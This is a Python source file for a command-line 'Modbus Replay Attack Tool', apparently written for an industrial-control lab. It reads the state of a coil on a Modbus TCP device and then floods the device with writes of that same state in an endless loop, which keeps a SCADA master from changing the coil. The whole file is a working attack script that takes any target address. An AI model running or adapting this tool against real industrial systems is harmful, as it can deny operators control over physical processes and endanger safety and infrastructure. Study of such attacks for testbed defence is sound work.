import sys
import time
import argparse
import inspect
from pymodbus.client import ModbusTcpClient

def get_unit_kwargs(method, unit_id):
    """Dynamically determine the right unit argument based on PyModbus version."""
    sig = inspect.signature(method)
    if 'device_id' in sig.parameters:
        return {'device_id': unit_id}
    elif 'slave' in sig.parameters:
        return {'slave': unit_id}
    else:
        return {'unit': unit_id}

def replay_attack(target_ip, target_port, unit_id, address):
    """
    Simulates an application-level Replay Attack.
    Captures the current state of a coil, and aggressively writes that exact
    state back to the RTU in a tight loop. This prevents any other client
    (like the SCADA Master) from successfully changing the coil's state.
    """
    client = ModbusTcpClient(target_ip, port=target_port)
    
    if not client.connect():
        print(f"[-] Failed to connect to {target_ip}:{target_port}")
        return

    print(f"[*] Connected to {target_ip}:{target_port} (Unit {unit_id})")
    
    try:
        # 1. Capture phase: Read the current state of the coil
        print(f"[*] Capturing current state of Coil {address}...")
        kwargs_read = get_unit_kwargs(client.read_coils, unit_id)
        rr = client.read_coils(address, count=1, **kwargs_read)
        
        if rr.isError():
            print(f"[-] Failed to read initial state: {rr}")
            client.close()
            return
            
        captured_state = rr.bits[0]
        print(f"[+] State Captured! Coil {address} is {'ON' if captured_state else 'OFF'}.")
        print("[*] Beginning aggressive Replay Loop... (Press Ctrl+C to stop)")
        
        # 2. Replay phase: Aggressively write the captured state back
        kwargs_write = get_unit_kwargs(client.write_coil, unit_id)
        count = 0
        while True:
            client.write_coil(address, captured_state, **kwargs_write)
            count += 1
            if count % 100 == 0:
                print(f"    [+] Replayed packet {count} times...")
            
    except KeyboardInterrupt:
        print("\n[!] Replay Attack interrupted.")
    except Exception as e:
        print(f"[-] Error during replay attack: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Modbus Replay Attack Tool")
    parser.add_argument("--target", default="localhost", help="Target IP address")
    parser.add_argument("--port", type=int, default=5002, help="Target Port")
    parser.add_argument("--unit", type=int, default=1, help="Modbus Unit ID")
    parser.add_argument("--address", type=int, default=0, help="Coil Address to replay")

    args = parser.parse_args()
    
    replay_attack(args.target, args.port, args.unit, args.address)
